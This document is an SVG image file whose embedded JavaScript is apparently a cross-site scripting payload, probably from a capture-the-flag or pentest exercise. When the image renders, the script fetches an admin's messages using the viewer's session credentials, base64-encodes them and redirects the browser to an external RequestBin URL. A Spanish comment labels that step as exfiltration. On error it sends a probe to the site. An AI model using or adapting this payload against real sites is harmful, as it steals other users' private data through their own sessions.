<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script><![CDATA[
    (async function(){
      try {
        const adminId = 1;
        const resp = await fetch('/messages?id=' + adminId, {credentials: 'same-origin'});
        const json = await resp.json();
        const b64 = btoa(unescape(encodeURIComponent(JSON.stringify(json))));
        // Exfiltración a tu RequestBin:
        top.location = 'http://requestbin.whapi.cloud/14touqb1/?d=' + encodeURIComponent(b64);
      } catch (e) {
        try { top.location = '/?probe=' + encodeURIComponent('err:'+String(e)); } catch(_) {}
      }
    })();
  ]]></script>
</svg>

